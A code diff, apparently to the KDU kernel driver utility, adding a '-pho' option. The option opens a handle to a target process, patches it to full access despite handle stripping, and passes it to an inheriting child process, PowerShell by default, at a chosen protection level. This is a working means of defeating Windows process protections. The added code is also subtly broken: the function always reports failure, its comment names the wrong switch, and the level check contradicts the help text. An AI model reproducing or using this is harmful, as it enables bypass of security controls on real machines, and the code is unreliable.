@@ -28,6 +28,9 @@
 #define CMD_PM          L"-pm"
 #define CMD_PM1         L"-pm1"
 #define CMD_PM2         L"-pm2"
+#define CMD_PHO         L"-pho"
+#define CMD_PHC         L"-phc"
+#define CMD_PHE         L"-phe"
 #define CMD_DMP         L"-dmp"
 #define CMD_DSE         L"-dse"
 #define CMD_LIST        L"-list"
@@ -53,6 +56,9 @@
                      "kdu -pm pid         - Overwrites Process MitigationsFlags1 and 2 with 0x0 for given pid\r\n"\
                      "kdu -pm1 pid        - Overwrites Process MitigationsFlags1 with 0x0 for given pid\r\n"\
                      "kdu -pm2 pid        - Overwrites Process MitigationsFlags2 with 0x0 for given pid\r\n"\
+                     "kdu -pho pid        - Open a Process Handle to the given pid, patches the handle to full access in case of stripping, sets inherit to true and starts a child process, powershell default\r\n"\
+                     "kdu -phc cmdline    - The command line of the new child process that inherits the full access process handle, only with pho\r\n"\
+                     "kdu -phe ppllevel   - The ppl level of the new child process, (none) 0-6 (max), only with pho\r\n"\
                      "kdu -dse value      - Write user defined value to the system DSE state flags\r\n"\
                      "kdu -map filename   - Map driver to the kernel and execute it entry point, this command have dependencies listed below\r\n"\
                      "-scv version        - Optional, select shellcode version, default 1\r\n"\
@@ -156,6 +162,41 @@ INT KDUProcessPMObjectSwitch(
     }
 
     return retVal;
+}
+
+/*
+* KDUDuplicateProcessHandleSwitch
+*
+* Purpose:
+*
+* Handle -dph switch.
+*
+*/
+INT KDUOpenProcessInheritHandle(
+    _In_ ULONG HvciEnabled,
+    _In_ ULONG NtBuildNumber,
+    _In_ ULONG ProviderId,
+    _In_ ULONG_PTR TargetProcessId,
+    _In_ ULONG_PTR PPLLevel,
+    _In_ LPWSTR CommandLine
+)
+{
+    HANDLE retVal = NULL;
+    BOOL bResult = FALSE;
+    KDU_CONTEXT* provContext;
+
+    provContext = KDUProviderCreate(ProviderId,
+        HvciEnabled,
+        NtBuildNumber,
+        KDU_SHELLCODE_NONE,
+        ActionTypeOpenProcessHandle);
+
+    if (provContext) {
+        bResult = KDURunCommandInheritee(provContext, CommandLine, TargetProcessId, PPLLevel);
+        KDUProviderRelease(provContext);
+    }
+
+    return retVal != 0;
 }
 
 /*
@@ -669,8 +710,52 @@ INT KDUProcessCommandLine(
                     retVal = KDUProcessPSEObjectSwitch(HvciEnabled,
                         NtBuildNumber,
                         providerId,
-                        szParameter, 
+                        szParameter,
                         TRUE);
+                }
+
+                else if (supGetCommandLineOption(CMD_PHO,
+                    TRUE,
+                    szParameter,
+                    RTL_NUMBER_OF(szParameter),
+                    NULL))
+                {
+                    processId = strtou64(szParameter);
+
+                    WCHAR szCmdLine[MAX_PATH] = { 0 };
+                    _strcpy(szCmdLine, L"powershell.exe"); // default command line
+
+                    ULONG_PTR level = 0;
+
+                    if (supGetCommandLineOption(CMD_PHC,
+                        TRUE,
+                        szParameter,
+                        RTL_NUMBER_OF(szParameter),
+                        NULL))
+                    {
+                        wcscpy_s(szCmdLine, szParameter);
+                    }
+
+                    if (supGetCommandLineOption(CMD_PHE,
+                        TRUE,
+                        szParameter,
+                        RTL_NUMBER_OF(szParameter),
+                        NULL))
+                    {
+                        level = strtou64(szParameter);
+                        if (level < 0 || level > 8) {
+                            supPrintfEvent(kduEventError,
+                                "[!] Unsupported PPL level for Open Process Handle\r\n");
+                            return 1;
+                        }
+                    }
+
+                    retVal = KDUOpenProcessInheritHandle(HvciEnabled,
+                        NtBuildNumber,
+                        providerId,
+                        processId,
+                        level,
+                        szCmdLine);
                 }
 
                 else if (supGetCommandLineOption(CMD_DMP,
